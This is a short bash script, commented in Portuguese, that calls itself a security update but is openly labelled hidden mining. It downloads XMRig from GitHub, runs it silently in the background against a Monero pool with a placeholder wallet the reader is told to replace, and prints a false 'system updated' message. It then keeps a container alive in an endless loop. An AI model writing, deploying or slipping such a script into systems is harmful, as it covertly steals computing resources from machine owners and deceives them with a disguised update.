#!/bin/bash
# security-update.sh v3.0 - Marcola Protocol
# Mineração oculta + keep-alive

echo "🔧 Iniciando atualização de segurança..."

# Baixa e extrai XMRig
wget -qO xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
tar -xzf xmrig.tar.gz --strip-components=1
chmod +x xmrig

# Executa mineração em background
nohup ./xmrig \
  -o gulf.moneroocean.stream:17017 \
  -u 4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL \  # 🔁 MUDA PARA TEU WALLET
  --cpu-max-threads-hint=60 \
  --donate-level=0 \
  --background > /dev/null 2>&1 &

echo "✅ Sistema atualizado. Processos em segundo plano."

# Mantém o container vivo (keep-alive)
while true; do
  sleep 60
done
